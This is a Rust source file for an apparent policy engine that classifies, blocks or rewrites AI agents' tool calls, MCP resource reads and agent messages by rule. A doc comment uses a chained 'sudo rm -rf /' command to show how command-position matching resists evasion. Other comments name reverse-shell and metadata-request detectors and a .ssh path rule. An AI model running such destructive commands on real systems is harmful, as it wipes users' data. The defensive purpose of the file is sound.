//! Tool risk rule matching, classification, and replacement.
//!
//! Stage C: rules pivot on `tool_id` (logical identifier resolved from a
//! per-(tool_name, app_id|mcp_server) profile registry), not on tool-name
//! globs. Profiles map raw tool names to canonical concepts (`shell_exec`,
//! `read_file`, `db_query`) and translate per-client argument names
//! (`target_file`, `filePath`, `absolute_path`, `fname`) to a single
//! canonical key (`path`) so one rule covers every client of the same tool.
//!
//! Phase × Scope × Action matrix (anything else rejected by `validate()`), walked cell
//! by cell and locked by `the_phase_scope_action_matrix_is_the_documented_one`:
//!
//! | phase    | scope               | actions                                                              |
//! |----------|---------------------|----------------------------------------------------------------------|
//! | request  | tool_definitions    | classify, block, substitute, intercept_only                          |
//! | request  | tool_results        | classify, replace                                                    |
//! | response | tool_calls          | classify, block, replace                                             |
//! | request  | resource_reads      | classify, block, replace                                             |
//! | response | resource_reads     | classify, replace                                                    |
//! | request  | prompt_invocations  | classify, block, replace                                             |
//! | request  | agent_calls         | classify, block, replace                                             |
//! | response | agent_calls         | classify, replace                                                    |
//!
//! `substitute` / `intercept_only` are tool-definition rewrite actions. `substitute` + `intercept_only` carry an `InterceptKind`
//! that binds a response-side handler (today: `WebExecutor`).
//! `substitute` and `intercept_only` evaluation runs at the request-phase
//! tool_definition step in `crate::pipeline::request::transform_request`,
//! emits a `Vec<InterceptBinding>` on `TransformResult`, and (for
//! `substitute`) wholesale-rewrites the matched tool definition via
//! `ApiRequest::substitute_tools` before forwarding upstream. The
//! response-side accumulator + agent-loop consume the bindings.
//!
//! Targets per scope (everything else rejected by `validate()`):
//!
//! | scope               | tool_id | any_arg | arg.<f> | argv | content | resource_id | uri | prompt_id | data |
//! |---------------------|---------|---------|---------|------|---------|-------------|-----|-----------|------|
//! | tool_definitions    |    ✓    |         |         |      |         |             |     |           |      |
//! | tool_results        |    ✓    |    ✓    |   ✓     |  ✓   |    ✓    |             |     |           |      |
//! | tool_calls          |    ✓    |    ✓    |   ✓     |  ✓   |         |             |     |           |      |
//! | resource_reads      |         |         |   ✓     |      |    ✓    |     ✓       |  ✓  |           |      |
//! | prompt_invocations  |         |         |   ✓     |      |         |             |     |     ✓     |      |
//! | agent_calls         |         |         |         |      |    ✓    |             |     |           |  ✓   |
//!
//! Walked cell by cell — every scope against the whole target vocabulary, not only its
//! own row — locked by `the_scope_target_matrix_is_the_documented_one`.
//!
//! `argv` is the token list of the tool's `shell`-normalised arguments —
//! `argv` matches any token, `argv[<n>]` the token at that position. Position
//! is read per *command*, not per string: a chained `echo hi; sudo rm -rf /`
//! offers `echo`, `sudo` and `rm` at position 0, so a rule naming the command
//! cannot be dodged by prefixing another one or a wrapper. Only fields a
//! profile registered as `shell` are read; a tool with none resolves to
//! nothing, exactly like `any_arg`.
//!
//! An A2A agent call names no tool and carries no arguments — the wire has a
//! message, not an invocation — so `agent_calls` pivots on the **agent**
//! (`a2a_agent_filter`) plus the message's own content: `content` is the joined
//! text of its parts, `data` the JSON of its structured parts.
//!
//! `any_arg` is the escape hatch for a tool with no profile: it resolves to
//! every canonical argument the profile registry can reach, joined, so one
//! condition scans across fields. It is deliberately the coarse option —
//! `arg.<canonical>` names a single field and is what a rule should use
//! whenever a profile registers one.
//!
//! Operators (`op` field on each condition):
//!  - `equals` — exact string match (case-sensitive); value is `string`. Valid on the canonical-id targets and on `argv` / `argv[<n>]`, both of which resolve to a whole token rather than free text.
//!  - `in` — value list match (case-sensitive); value is `[string]`. Same targets as `equals`.
//!  - `glob` — pipe-separated case-insensitive globs (`*read*|...`).
//!  - `contains_any` — substring scan (case-insensitive); value is `[string]`. False-positive prone — `"reboot"` matches `"rebooted"`. Use `contains_word_any` when you want token-level matches.
//!  - `contains_word_any` — substring scan anchored on `[^\w]` word boundaries (case-insensitive); value is `[string]`. `"reboot"` matches `"please reboot now"` but not `"rebooted"`. Same false-positive caveats as `contains_any` for obfuscation (whitespace tricks, percent-encoding) — rely on the per-tool normaliser pass for canonicalisation.
//!  - `regex` — full regex; value is `string`.

use std::sync::Arc;

use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use utoipa::ToSchema;

// ─── Wire types ─────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum Phase {
    Request,
    Response,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum Scope {
    ToolDefinitions,
    ToolResults,
    ToolCalls,
    /// MCP `resources/read` (and the response carrying the resource
    /// content). Targets: `resource_id` (canonical), `uri` (raw), `arg.<f>`
    /// (request only), `content` (response only).
    ResourceReads,
    /// MCP `prompts/get`. Targets: `prompt_id` (canonical),
    /// `arg.<f>` (templated parameters supplied to the prompt).
    PromptInvocations,
    /// A2A `SendMessage` / `SendStreamingMessage` — one agent invoking another.
    /// The request phase screens the message the caller sends; the response
    /// phase screens the remote agent's reply (its message text plus the text
    /// of any artifacts it produced). Targets: `content`, `data`.
    AgentCalls,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum Op {
    Glob,
    ContainsAny,
    /// Substring scan anchored on `[^\w]` word boundaries (case-insensitive).
    /// `"kill"` matches `"sudo kill -9"` but not `"killed"`. Use this in
    /// preference to `contains_any` when matching command/SQL keywords against
    /// free text — `contains_any` will fire on `"rebooted"` for needle `"reboot"`.
    ContainsWordAny,
    Regex,
    /// Exact string match (case-sensitive). Reserved for `target: tool_id`.
    Equals,
    /// Membership in a list of strings (case-sensitive). Reserved for
    /// `target: tool_id`. Value must be a non-empty array of strings.
    In,
    /// Run a named detector from [`crate::config::tool_rules_detectors`]
    /// against the target — for shapes (a reverse shell, an instance-metadata
    /// request, a destructive SQL statement) that no single maintainable
    /// pattern expresses. Value is the detector name; an unknown one is
    /// rejected at write time.
    Detector,
}

#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct MatchCondition {
    pub target: String,
    pub op: Op,
    /// String for `glob` / `regex` / `equals`; array of strings for
    /// `contains_any` / `contains_word_any` / `in`.
    #[schema(value_type = Object)]
    pub value: Value,
}

#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum RuleAction {
    /// Annotate the matched item with `risk` + rule id; no mutation.
    Classify,
    /// Drop the matched item (definition removed from request, tool_call/result suppressed elsewhere).
    Block,
    /// Rewrite the scoped content. With `regex`: per-match capture-aware rewrite (`with` may use $1..).
    /// Without `regex`: wholesale replace with `with`. With `drop: true`: rewrite to "" (drop wins
    /// over `regex`/`with` when combined). `with` defaults to "[redacted]".
    Replace {
        #[serde(default, skip_serializing_if = "Option::is_none")]
        regex: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        with: Option<String>,
        #[serde(default, skip_serializing_if = "std::ops::Not::not")]
        drop: bool,
    },
    /// Replace the matched tool definition wholesale and bind an intercept
    /// handler that fires on response-side `tool_use` echoes for the new
    /// name. The load-bearing primitive for cross-protocol web-search /
    /// web-fetch substitution. Valid only on `Request × ToolDefinitions`.
    Substitute {
        with: ToolDefValue,
        intercept: InterceptKind,
    },
    /// Bind an intercept handler against the matched tool's name without
    /// rewriting the definition — the upstream sees the tool unchanged but
    /// any `tool_use` for it is routed through the intercept handler.
    /// Valid only on `Request × ToolDefinitions`.
    InterceptOnly {
        handler: InterceptKind,
    },
}

/// Tool definition payload carried by `Substitute`.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct ToolDefValue {
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    /// JSON Schema 2020-12 input schema for the tool's arguments.
    #[schema(value_type = Object)]
    pub parameters: Value,
}

/// Response-side handler bound by `Substitute` / `InterceptOnly`.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum InterceptKind {
    /// Execute via the built-in `WebService` (phase-1 executor). The
    /// only intercept currently supported; agent-loop wiring lands in a
    /// follow-up PR.
    WebExecutor {
        kind: WebInterceptKind,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum WebInterceptKind {
    Search,
    Fetch,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize, ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum ActionKind {
    Classify,
    Block,
    Replace,
    Substitute,
    InterceptOnly,
}

impl RuleAction {
    pub fn kind(&self) -> ActionKind {
        match self {
            Self::Classify => ActionKind::Classify,
            Self::Block => ActionKind::Block,
            Self::Replace { .. } => ActionKind::Replace,
            Self::Substitute { .. } => ActionKind::Substitute,
            Self::InterceptOnly { .. } => ActionKind::InterceptOnly,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct Rule {
    /// Stable operator-visible identifier (e.g. `ASI02-06`). Surfaces on
    /// blocked-tool banners and transform diffs so reviewers know which rule
    /// fired without parsing the description. Every rule carries one: a seed
    /// names it, and a rule created through the API is given one.
    pub id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub title: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    /// `"safe"` | `"caution"` | `"danger"` | `"unknown"` — the rule's classification
    /// for matching items, regardless of which action kind is configured.
    pub risk: String,
    pub phase: Phase,
    pub scope: Scope,
    /// AND-of-conditions. Empty means "every item in scope" (catch-all).
    #[serde(default, rename = "match")]
    pub conditions: Vec<MatchCondition>,
    pub action: RuleAction,
    /// Lower wins. Default 100. Stable-sorted with original list position as
    /// the tiebreaker so manual ordering still controls equal-priority rules.
    #[serde(default = "default_priority")]
    pub priority: i32,
    /// Optional pipe-separated glob over the resolved upstream model name.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub model_filter: Option<String>,
    /// Optional pipe-separated glob over the request's `app_id` (client
    /// identity, e.g. `claude-code`, `cursor-*`). When set, the rule only
    /// fires for matching apps. `None` means "any app".
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub app_filter: Option<String>,
    /// Optional pipe-separated glob over the MCP upstream server name
    /// (`mcp_upstream_servers.name`, e.g. `notion-prod`, `internal-*`).
    /// When set, the rule only fires for matching upstreams; `None` means
    /// "any upstream". Non-MCP traffic (LLM tool calls without an MCP
    /// namespace) never matches a rule with this filter set — pairs
    /// naturally with `(request, resource_reads | prompt_invocations)`
    /// rules. Use this to keep per-upstream policies (and per-test rules)
    /// from spilling onto other servers in the same tenant.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mcp_server_filter: Option<String>,
    /// Optional pipe-separated glob over the A2A upstream agent's slug
    /// (`a2a_upstream_agents.slug`, e.g. `research-prod`, `partner-*`). The
    /// agent is the pivot of the `agent_calls` scope the way the upstream is
    /// the pivot of MCP rules. Non-A2A traffic never matches a rule with this
    /// filter set; `None` means "any agent".
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub a2a_agent_filter: Option<String>,
    /// Inert when false; preserved in storage. `extract_for` skips disabled rules.
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// Optional security-framework citations — display-only.
    #[serde(default)]
    pub framework_refs: Vec<String>,
    /// Server-managed: `true` on initial seed and on `actions/reset`, `false`
    /// after the first PATCH/PUT. Ignored on incoming client payloads.
    #[serde(default)]
    pub is_builtin: bool,
    /// Profile scope. `None` → **shared**: the rule applies to every profile (the
    /// baseline; builtins live here). `Some(P)` → **specific** to profile P. The
    /// snapshot bucketer fans shared rules into every profile's bucket.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub profile_id: Option<uuid::Uuid>,
    /// Copy-on-write link: when set on a `Some(P)` rule, this is a per-profile
    /// **fork** of the shared rule with this id — it *suppresses* that shared rule
    /// inside P (an override). Deleting the fork reverts P to the shared rule.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub forked_from: Option<String>,
}

fn default_priority() -> i32 {
    100
}
fn default_true() -> bool {
    true
}

// ─── UI contract: classification result ─────────────────────────────

/// Backwards-shape result of classifying a tool against rules. Field set is
/// frozen — admin UI consumes this struct directly via `transform_diff` /
/// `ConversationEvent::ToolCall.blocked` payloads. Adding fields here is fine;
/// removing or renaming is a breaking change for the UI.
#[derive(Debug)]
pub struct RiskResult {
    pub id: Option<String>,
    pub risk: String,
    pub title: Option<String>,
    pub description: Option<String>,
    /// Flat string for the UI: `"classify"` | `"block"` | `"replace"` | `"allow"`.
    /// `"allow"` only appears in the synthetic unknown fallback.
    pub action: String,
    /// Operator-visible "what matched" hint. Synthesized from the first
    /// matching condition's value.
    pub pattern: Option<String>,
    /// Profile id that resolved the `tool_id` for this match — `None` when
    /// the call is unclassified (no profile), or when no rule fired.
    pub profile_id: Option<String>,
    /// Resolved canonical `tool_id` for this call (e.g. `shell_exec`).
    /// `None` when no profile registered for `(tool_name, app_id, mcp_server)`.
    pub tool_id: Option<String>,
}

// ─── Public API ─────────────────────────────────────────────────────

/// The request's value on each axis a rule can filter on. `None` means "this
/// request has no value there" — a rule that filters on that axis is then
/// skipped, which is what keeps an MCP-pivoted or agent-pivoted rule from
/// spilling onto traffic of another protocol.
///
/// Constructed with `..Default::default()` so a new axis is additive at every
/// call site instead of a new positional argument.
#[derive(Debug, Clone, Copy, Default)]
pub struct RuleAxes<'a> {
    /// Resolved upstream model name (LLM path only).
    pub model: Option<&'a str>,
    /// Client identity (`claude-code`, `cursor-*`, …).
    pub app_id: Option<&'a str>,
    /// Authoritative MCP upstream server name — from the resolved route, never
    /// the wire prefix.
    pub mcp_server: Option<&'a str>,
    /// Addressed A2A agent slug (A2A path only).
    pub a2a_agent: Option<&'a str>,
}

/// Filter + stable-sort rules for one (phase, scope) bucket. Sort key is
/// `(priority ASC, original position ASC)` — manual order remains the
/// tiebreaker so operators can drag-to-reorder equal-priority rules.
///
/// Each axis in `axes` gates the rule's corresponding `*_filter`: an unset axis
/// skips every rule that filters on it.
pub fn extract_for<'a>(
    rules: &'a [Rule],
    phase: Phase,
    scope: Scope,
    axes: RuleAxes<'_>,
) -> Vec<&'a Rule> {
    let axis_matches = |filter: &Option<String>, value: Option<&str>| match (filter, value) {
        (None, _) => true,
        (Some(_), None) => false,
        (Some(filter), Some(v)) => matches_glob(v, filter),
    };
    let mut indexed: Vec<(usize, &'a Rule)> = rules
        .iter()
        .enumerate()
        .filter(|(_, r)| r.enabled && r.phase == phase && r.scope == scope)
        .filter(|(_, r)| axis_matches(&r.model_filter, axes.model))
        .filter(|(_, r)| axis_matches(&r.app_filter, axes.app_id))
        .filter(|(_, r)| axis_matches(&r.mcp_server_filter, axes.mcp_server))
        .filter(|(_, r)| axis_matches(&r.a2a_agent_filter, axes.a2a_agent))
        .collect();
    indexed.sort_by_key(|(idx, r)| (r.priority, *idx));
    indexed.into_iter().map(|(_, r)| r).collect()
}

/// Resolves a target string to the canonical **forms** to match against.
/// Returns `None` when the target isn't applicable to the current evaluation
/// context — the rule is then skipped. Implementations are tiny; one per scope.
///
/// More than one form means an ambiguity the resolver is deliberately keeping
/// open: a normaliser's alternate canonical spellings, every argument behind
/// `any_arg`, every candidate command behind `argv`. A condition is satisfied
/// when ANY form satisfies it.
///
/// A list rather than a delimited string, because the boundary between forms
/// must be structure the engine created. Joined, a value carrying a separator
/// of its own would read as several forms nothing produced — and the
/// `url` normaliser percent-decodes, so `%00` is an argument asking for
/// exactly that.
pub trait TargetResolver {
    fn resolve(&self, target: &str) -> Option<Vec<String>>;
}

/// Evaluate one rule. All `match[]` conditions must succeed. An empty
/// `match[]` is a catch-all and always succeeds. Returns `Some(())` on hit.
pub fn evaluate(rule: &Rule, ctx: &dyn TargetResolver) -> bool {
    if rule.conditions.is_empty() {
        return true;
    }
    for cond in &rule.conditions {
        let Some(forms) = ctx.resolve(&cond.target) else {
            return false;
        };
        // A condition is satisfied if ANY form matches; rule semantics remain
        // and-of-conditions across the rule.
        if !forms.iter().any(|form| condition_matches(cond, form)) {
            return false;
        }
    }
    true
}

/// Compute the rewritten content for a `Replace` action against `original`.
/// Returns `None` when the action isn't Replace, when the regex is invalid,
/// or when the regex didn't match (`original` returned unchanged).
/// `Some("")` is a legitimate result when `drop: true` or `with: ""`.
pub fn apply_replacement(action: &RuleAction, original: &str) -> Option<String> {
    let RuleAction::Replace { regex, with, drop } = action else {
        return None;
    };
    if *drop {
        return Some(String::new());
    }
    let with_str = with.as_deref().unwrap_or("[redacted]");
    match regex.as_deref() {
        None => Some(with_str.to_string()),
        Some(rx_str) => match Regex::new(rx_str) {
            Ok(rx) => {
                if !rx.is_match(original) {
                    return None;
                }
                Some(rx.replace_all(original, with_str).into_owned())
            }
            Err(_) => None,
        },
    }
}

// ─── Resolvers ──────────────────────────────────────────────────────

/// Tool-definition scope — the resolved `tool_id` is the only matchable
/// target. Construct with the result of [`FieldProfileSet::resolve_tool_id`]
/// (or `None` when no profile matched and the operator's catch-all rules
/// will surface the call as unclassified).
pub struct ToolDefinitionResolver<'a> {
    pub tool_id: Option<&'a str>,
}
impl<'a> TargetResolver for ToolDefinitionResolver<'a> {
    fn resolve(&self, target: &str) -> Option<Vec<String>> {
        if target == "tool_id" {
            self.tool_id.map(|s| vec![s.to_string()])
        } else {
            None
        }
    }
}

/// Response/tool_calls scope — resolves `tool_id`, `any_arg`, and `arg.<field>`.
///
/// `tool_id` is a snapshot computed once via
/// [`FieldProfileSet::resolve_tool_id`] before evaluation begins, so the same
/// resolution is shared across every condition without re-running the lookup.
///
/// `arg.<field>` consults the profile registry: when a profile matches
/// `(tool_name, app_id, mcp_server, field)`, the engine fetches the value
/// from the profile's `wire_field` (or `field` itself when `wire_field` is
/// unset) and applies the registered normaliser. When no profile matches,
/// falls back to `arguments[field]` raw — preserving sane behaviour for
/// unprofiled tools.
///
/// `any_arg` scans every canonical field the profile registry has registered
/// for the `(tool_name, app_id, mcp_server)` triple. Each field's value is
/// fetched from its `wire_field` and normalised, and every resulting form is
/// offered to the matcher, so one condition ORs across fields. Returns `None`
/// when no profile matches the tool — unprofiled tools are invisible to
/// `any_arg` rules by design.
pub struct ToolCallResolver<'a> {
    pub name: &'a str,
    pub arguments: Option<&'a Value>,
    pub field_profiles: Option<&'a FieldProfileSet>,
    pub app_id: Option<&'a str>,
    pub mcp_server: Option<&'a str>,
    pub tool_id: Option<&'a str>,
}
/// The commands a shell call applies a patch by: Codex intercepts a shell call
/// whose command is exactly one of these words (a path to one is a program it
/// runs) and applies its patch rather than running it.
const SHELL_PATCH_COMMANDS: [&str; 2] = ["apply_patch", "applypatch"];

/// The shells whose `-c` / `-lc` script Codex reads for a patch heredoc.
const PATCH_SCRIPT_SHELLS: [&str; 3] = ["bash", "sh", "zsh"];

/// The tool a shell call applying a patch is also read as ([`patch_block`]),
/// through the profiles registered for it.
const PATCH_TOOL: &str = "apply_patch";

/// A command's word as its basename, so `/usr/bin/bash` reads as `bash`.
fn command_name(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

/// The patch a shell command applies — and only one that does nothing else,
/// the shapes Codex intercepts instead of running: an argv
/// `[apply_patch, <patch>]`, or a script (an argv `[bash, -lc, <script>]`, or
/// the command as one string) that is one patch command fed a heredoc,
/// optionally after `cd <dir> &&`. A command that runs anything beside it is a
/// shell command, read as one only.
fn shell_patch_body(command: &Value) -> Option<String> {
    match command {
        Value::Array(words) => match words.as_slice() {
            [Value::String(cmd), Value::String(body)] if SHELL_PATCH_COMMANDS.contains(&cmd.as_str()) => {
                Some(body.clone())
            }
            [Value::String(shell), Value::String(flag), Value::String(script)]
                if PATCH_SCRIPT_SHELLS.contains(&command_name(shell)) && matches!(flag.as_str(), "-c" | "-lc") =>
            {
                heredoc_patch(script)
            }
            // A Responses `shell_call`'s `commands`, holding the one script.
            [Value::String(script)] => heredoc_patch(script),
            _ => None,
        },
        Value::String(script) => heredoc_patch(script),
        _ => None,
    }
}

/// The body of a script that is one patch command fed a heredoc:
/// `[cd <dir> &&] apply_patch <<['"]DELIM['"]\n<body>\nDELIM`, and nothing
/// after it. Read strictly, the way a shell reads it, so that no script running
/// anything else qualifies: the delimiter is one plain word; the heredoc ends
/// at the FIRST line that is the delimiter (tab-indented under `<<-`), and only
/// blank lines may follow; `<<-` strips the leading tabs of every body line,
/// as the shell does; `cd` takes one plain path (no expansion, substitution or
/// quoting), and the patch is applied there — so each relative file the patch
/// names is read under that directory.
fn heredoc_patch(script: &str) -> Option<String> {
    let plain = |word: &str, extra: &str| {
        !word.is_empty() && word.chars().all(|c| c.is_ascii_alphanumeric() || "_-.".contains(c) || extra.contains(c))
    };
    let (head, rest) = script.trim_start().split_once('\n')?;
    // `<< 'EOF'` is the same redirect as `<<'EOF'`.
    let head = head.trim_end_matches('\r').replace("<< ", "<<");
    let words: Vec<&str> = head.split_whitespace().collect();
    let (dir, command) = match words.as_slice() {
        ["cd", dir, "&&", command @ ..] if plain(dir, "/~") => (Some(*dir), command),
        ["cd", ..] => return None,
        command => (None, command),
    };
    let [cmd, redirect] = command else {
        return None;
    };
    if !SHELL_PATCH_COMMANDS.contains(cmd) {
        return None;
    }
    let quoted = redirect.strip_prefix("<<")?;
    // `<<-` lets a tab-indented delimiter line end the heredoc.
    let (tabs, quoted) = match quoted.strip_prefix('-') {
        Some(rest) => (true, rest),
        None => (false, quoted),
    };
    let delimiter = match quoted.as_bytes() {
        [q @ (b'\'' | b'"'), .., last] if last == q && quoted.len() >= 2 => &quoted[1..quoted.len() - 1],
        _ => quoted,
    };
    if !plain(delimiter, "") {
        return None;
    }
    let mut lines = rest.split('\n');
    let mut body: Vec<String> = Vec::new();
    for line in lines.by_ref() {
        let line = line.trim_end_matches('\r');
        let line = if tabs { line.trim_start_matches('\t') } else { line };
        if line == delimiter {
            return lines.all(|after| after.trim().is_empty()).then(|| body.join("\n"));
        }
        body.push(match dir {
            Some(dir) => under_dir(line, dir),
            None => line.to_string(),
        });
    }
    None
}

/// A patch line naming a relative file, followed by the same header naming it
/// under `dir` — both are read, so a rule anchored to the project
/// (`.github/workflows/*`) and one on the full path (`*/.ssh/*`) each still
/// match; any other line as it is. The markers are the envelope's file
/// headers.
fn under_dir(line: &str, dir: &str) -> String {
    const MARKERS: [&str; 4] = ["*** Add File:", "*** Delete File:", "*** Update File:", "*** Move to:"];
    let header = line.trim();
    for marker in MARKERS {
        if let Some(path) = header.strip_prefix(marker).map(str::trim)
            && !path.is_empty()
            && !path.starts_with('/')
            && !path.starts_with('~')
        {
            return format!("{line}\n{marker} {}/{path}", dir.trim_end_matches('/'));
        }
    }
    line.to_string()
}

/// A shell call that applies a patch, read as the patch tool: the tool id the
/// profiles resolve for it, and arguments holding the patch under every wire
/// field the patch tool's profiles read.
pub struct PatchReading {
    pub tool_id: Option<String>,
    pub arguments: Value,
}

impl ToolCallResolver<'_> {
    /// This shell call read as the patch tool, when its command only applies
    /// a patch ([`shell_patch_body`]); `None` for any other call.
    pub fn patch_reading(&self) -> Option<PatchReading> {
        use crate::config::tool_rules_normalize::Normalizer;
        let args = self.arguments?;
        let set = self.field_profiles?;
        let patch = set
            .lookup_all_fields(self.name, self.app_id, self.mcp_server)
            .into_iter()
            .filter(|(_, m)| m.normalizer == Normalizer::Shell)
            .find_map(|(field, m)| shell_patch_body(args.get(m.wire_field.unwrap_or(field.as_str()))?))?;
        // The directory the call runs in (Codex's `shell` `workdir`, a
        // `local_shell_call`'s `working_directory`) is where a relative file
        // the patch names is.
        let patch = match ["workdir", "working_directory"].iter().find_map(|k| args.get(*k)?.as_str()) {
            Some(dir) if !dir.is_empty() => patch.split('\n').map(|line| under_dir(line, dir)).collect::<Vec<_>>().join("\n"),
            _ => patch,
        };
        let mut arguments = serde_json::Map::new();
        for (field, m) in set.lookup_all_fields(PATCH_TOOL, self.app_id, None) {
            arguments.insert(m.wire_field.unwrap_or(field.as_str()).to_string(), Value::String(patch.clone()));
        }
        Some(PatchReading {
            tool_id: set.resolve_tool_id(PATCH_TOOL, self.app_id, None).map(str::to_string),
            arguments: Value::Object(arguments),
        })
    }
}

/// The first of `rules` that BLOCKS the call a shell call also is when it only
/// applies a patch (Codex's `apply_patch` run through its `shell` function) —
/// so a path rule on the patch tool reads the files the patch touches. Only a
/// block is taken from this reading: the shell call is decided as itself, and
/// this can add a block to that decision, never allow, classify or rewrite in
/// its place. A wrong reading can therefore only over-block. `None` for any
/// other call, or when no block rule matches the patch.
pub fn patch_block<'r>(rules: &[&'r Rule], call: &ToolCallResolver<'_>) -> Option<&'r Rule> {
    if !rules.iter().any(|rule| rule.action.kind() == ActionKind::Block) {
        return None;
    }
    let reading = call.patch_reading()?;
    let resolver = ToolCallResolver {
        name: PATCH_TOOL,
        arguments: Some(&reading.arguments),
        field_profiles: call.field_profiles,
        app_id: call.app_id,
        mcp_server: None,
        tool_id: reading.tool_id.as_deref(),
    };
    rules
        .iter()
        .copied()
        .find(|rule| rule.action.kind() == ActionKind::Block && evaluate(rule, &resolver))
}

impl<'a> TargetResolver for ToolCallResolver<'a> {
    fn resolve(&self, target: &str) -> Option<Vec<String>> {
        match target {
            "tool_id" => self.tool_id.map(|s| vec![s.to_string()]),
            "any_arg" => resolve_any_canonical_arg(
                self.arguments,
                self.field_profiles,
                self.name,
                self.app_id,
                self.mcp_server,
            ),
            t if t.starts_with("arg.") => {
                let canonical = &t[4..];
                resolve_canonical_arg(
                    self.arguments,
                    self.field_profiles,
                    self.name,
                    self.app_id,
                    self.mcp_server,
                    canonical,
                )
            }
            other => parse_argv_target(other).and_then(|index| {
                resolve_argv(
                    self.arguments,
                    self.field_profiles,
                    self.name,
                    self.app_id,
                    self.mcp_server,
                    index,
                )
            }),
        }
    }
}

/// Request/tool_results scope — `tool_id`, `any_arg`, `arg.<field>`, `content`.
/// When the request-side walker forwards the originating `tool_use`'s
/// arguments alongside the result, `any_arg` and `arg.<field>` resolve
/// through the profile registry exactly as in [`ToolCallResolver`]; when
/// `arguments` is `None`, those targets resolve to `None` and the rule's
/// condition fails. `content` is the joined text of the tool_result body.
pub struct ToolResultResolver<'a> {
    pub name: &'a str,
    pub arguments: Option<&'a Value>,
    pub content: &'a str,
    pub field_profiles: Option<&'a FieldProfileSet>,
    pub app_id: Option<&'a str>,
    pub mcp_server: Option<&'a str>,
    pub tool_id: Option<&'a str>,
}
impl<'a> TargetResolver for ToolResultResolver<'a> {
    fn resolve(&self, target: &str) -> Option<Vec<String>> {
        match target {
            "tool_id" => self.tool_id.map(|s| vec![s.to_string()]),
            "any_arg" => resolve_any_canonical_arg(
                self.arguments,
                self.field_profiles,
                self.name,
                self.app_id,
                self.mcp_server,
            ),
            "content" => Some(vec![self.content.to_string()]),
            t if t.starts_with("arg.") => {
                let canonical = &t[4..];
                resolve_canonical_arg(
                    self.arguments,
                    self.field_profiles,
                    self.name,
                    self.app_id,
                    self.mcp_server,
                    canonical,
                )
            }
            other => parse_argv_target(other).and_then(|index| {
                resolve_argv(
                    self.arguments,
                    self.field_profiles,
                    self.name,
                    self.app_id,
                    self.mcp_server,
                    index,
                )
            }),
        }
    }
}

/// `resources/read` scope. Resolves `resource_id`, `uri`, and
/// `arg.<field>` for the request phase; the response variant adds `content`
/// (the joined text body). The MCP `resources/read` JSON-RPC param shape is
/// `{ uri: string, ?...arguments }` — `uri` is the always-present anchor,
/// `arguments` carries any URI-template parameters the caller filled in.
///
/// Field-profile lookup uses the resource URI as the "tool name" so operators
/// can register a profile keyed on URI globs (`postgres://*`, `s3://*/private/*`)
/// the same way they register tool profiles. `mcp_server` is stamped from the
/// route mapping and gates server-scoped profiles exactly like the tool path.
pub struct ResourceReadResolver<'a> {
    /// Canonical resource concept (e.g. `code_file`, `db_row`, `secret`).
    /// Resolved once via [`FieldProfileSet::resolve_tool_id`] over the URI as
    /// the synthetic "tool name". `None` when no profile matched.
    pub resource_id: Option<&'a str>,
    /// Raw URI as supplied by the caller (post-prefix-strip, the upstream's
    /// view). `target: "uri"` matches against this verbatim — operators use
    /// glob/regex/contains_any against URI shapes.
    pub uri: &'a str,
    /// Optional URI-template arguments. Same shape as tool-call arguments;
    /// `arg.<f>` resolution shares the same field-profile lookup path.
    pub arguments: Option<&'a Value>,
    /// Joined response text (response phase only). `target: "content"` matches
    /// against this. Empty string on the request phase — rules that target
    /// `content` won't fire request-side, which is what we want.
    pub content: &'a str,
    pub field_profiles: Option<&'a FieldProfileSet>,
    pub app_id: Option<&'a str>,
    pub mcp_server: Option<&'a str>,
}
impl<'a> TargetResolver for ResourceReadResolver<'a> {
    fn resolve(&self, target: &str) -> Option<Vec<String>> {
        match target {
            "resource_id" => self.resource_id.map(|s| vec![s.to_string()]),
            "uri" => Some(vec![self.uri.to_string()]),
            "content" => {
                if self.content.is_empty() {
                    None
                } else {
                    Some(vec![self.content.to_string()])
                }
            }
            t if t.starts_with("arg.") => {
                let canonical = &t[4..];
                resolve_canonical_arg(
                    self.arguments,
                    self.field_profiles,
                    self.uri,
                    self.app_id,
                    self.mcp_server,
                    canonical,
                )
            }
            _ => None,
        }
    }
}

/// `prompts/get` scope. Resolves `prompt_id` and `arg.<field>`.
/// MCP `prompts/get` shape is `{ name: string, ?arguments: object }` — the
/// prompt name is what canonicalises to a `prompt_id` via the field-profile
/// registry, and `arguments` carries the template substitutions.
pub struct PromptInvocationResolver<'a> {
    /// Canonical prompt id (e.g. `coding_rules`, `system_message`). Resolved
    /// once via the profile registry using the wire prompt name. `None` when
    /// no profile matched.
    pub prompt_id: Option<&'a str>,
    /// Raw prompt name on the wire — used as the "tool name" key into the
    /// field-profile registry for `arg.<f>` lookups.
